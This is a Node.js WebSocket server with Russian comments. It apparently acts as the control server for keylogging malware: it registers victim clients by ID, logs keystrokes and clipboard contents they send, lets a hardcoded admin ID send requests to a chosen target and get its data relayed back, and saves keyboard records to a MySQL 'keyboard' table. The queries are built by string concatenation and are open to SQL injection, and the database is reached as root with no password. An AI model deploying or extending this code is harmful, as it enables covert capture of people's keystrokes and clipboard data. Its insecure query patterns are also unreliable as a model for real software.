var adminID = '8f51dfd14221bc7d6adaefdf0533bf9e2af2d21e1395c6085fdf76943734c271';
// подключенные клиенты
var clients = [];
var targets = [];
var WebSocketServer = require('ws').Server;
var LRCDataReader = require('./lrcdata-reader.js');

//Database config
var mysql      = require('mysql');
var database = mysql.createConnection({
    host     : 'localhost',
    user     : 'root',
    password : '',
    database : 'lrc'
});



// WebSocket-сервер на порту 25565
var webSocketServer = new WebSocketServer({ port: 25565 });
console.log ('Server is runing');

webSocketServer.on('connection', connection);

function connection(ws) {
    console.log('[Info]New client conected');

    var lastAnswer = [];
    var isAuthorized = false;
    var isJSONParsed = true;

    //If noAuth close connection
    setTimeout(function() {
        if(!isAuthorized){
            ws.close();
        }
    },60000);

    ws.on('message', function incoming(message, flags) {
        if(flags['binary']){
            parse_binary_message(message,ws);
            return;
        }

        //Try to parse JSON
        parse_JSON();

        //Check id length
        if(lastAnswer['id'] == null){
            console.log('[ERROR]Id = NULL !');
            ws.close();
            return;
        }
        if (lastAnswer['id'].length != 64) {
            console.log('[ERROR]Incorect id length!');
            ws.close();
            return;
        }

        /*console.log('id = ' + inputArr['id']);
         console.log(clients[inputArr['id']]);
         clients[inputArr['id']] = ws;*/
        if (clients[lastAnswer['id']] == null) {
            clients[lastAnswer['id']] = ws;
            ws.send('accepted');
            console.log('[Info]Client is authorized ' + lastAnswer['id']);
            isAuthorized = true;
        }
        else {
            //Procesing data
            if (lastAnswer['ok']) {
                if(targets[lastAnswer['id']]) {
                    if(isJSONParsed) {
                        try {
                            clients[adminID].send(lastAnswer['data']);
                        }
                        catch (e) {
                            console.log('[WARNING]Admin is disconected error + ' + e + '!');
                        }
                    }
                    else {
                        clients[adminID].send('[ERROR]Client JSON is not parsed !');
                    }
                }
                else {
                    switch (lastAnswer['type']) {
                        case 'keyboard':
                            console.log('Keyboard: ' + lastAnswer['data'][0]['vk']);
                            getData(lastAnswer['id'], 'getkeyboard');
                            break;
                        case 'clipboard':
                            console.log('Clipboard: ' + lastAnswer['data'][0]['vk']);
                            getData(lastAnswer['id'], 'getclipboard');
                            break;
                        case 'request':
                            if (lastAnswer['id'] == adminID) {
                                console.log('Request: ' + lastAnswer['data']['request']);
                                targets[lastAnswer['data']['targetId']] = true;
                                try {
                                    clients[lastAnswer['data']['targetId']].send(lastAnswer['data']['request']);
                                }
                                catch (e) {
                                    ws.send('[ERROR]Client is offline now!');
                                }
                            }
                            else {
                                console.log('[ERROR]Incorect adminId!');
                            }
                            break;
                    }
                }
            }
            else {
                console.log('[Client ERROR]' + lastAnswer['error']);
            }
        }


        function parse_JSON () {
            var backUpJSON = lastAnswer;
            try {
                lastAnswer = JSON.parse(message);
            }
            catch (e) {
                lastAnswer = backUpJSON;
                console.log('[ERROR]Failed to parse JSON!');
                ws.close();
                isJSONParsed = false;
            }
        }
    });
    ws.on('close', function close() {
            /*console.log('[CLOSE !!!] ' + lastAnswer['id']);
            var test = (lastAnswer['id'] in clients);
            console.log('[INDEXOF !!!] ' + test);*/

            if(lastAnswer['id'] in clients) {
                 delete  clients[lastAnswer['id']];
                //database.end();
                console.log('[Info]Conection closed id ' + lastAnswer['id']);
            }
            else{
                console.log('[Info]Conection closed client unauthorized' );
            }
        }
    );
}

function parse_binary_message (data,ws) {
    var lrcdata = LRCDataReader.read(data);
    if (!lrcdata.ok) {
        console.log('[ERROR]Can\'t parse LRCData');
        return;
    }

    if (clients[lrcdata['id']] == null) {
        clients[lrcdata['id']] = ws;
        ws.send('accepted');
        console.log('[Info]Client is authorized ' + lrcdata['id']);
        isAuthorized = true;
    }

    console.log(lrcdata.data.items);
    saveData();

    /*var sql = "SELECT * FROM ?? WHERE ?? = ?";
     var inserts = ['users', 'id', userId];
     sql = mysql.format(sql, inserts);*/
    function saveData() {
        database.query('SELECT id FROM users WHERE shaId = "' + lrcdata.id + '" LIMIT 1', function (err, rows, fields) {
            var id;
            if (err != null) {
                console.log('[ERROR]SELECT id' + err);
                return;
            }
            if (rows.length == 0) {
                database.query('INSERT INTO users (shaId) VALUES ("' + lrcdata.id + '")', function (err, result) {
                    id = result.insertId;
                    console.log('id = defined');
                    insertKeyboard ();
                });
                console.log('[INFO]User inserted');
            }
            else
            {
                id = rows[0]['id'];
                insertKeyboard ();
            }
            function insertKeyboard () {
                console.log('ID --------------------- ' + id);
                database.query('INSERT INTO keyboard (userId) VALUES (' + id + ')', function (err, rows, fields) {
                    if (err != null) {
                        console.log('INSERT keyboard ERROR' + err);
                        return;
                    }
                    console.log('[INFO] data inserted');
                });
            }
        });
    }
}

/*
database.query('INSERT INTO users (shaId) VALUES ("0229c6d61077b9e9e1e8f8ad0be3f95ee66bfcafd8333b5322cc1a923b3147cf")', function (err, rows, fields) {
    console.log(rows.insertId);
    console.log(fields);
});
*/
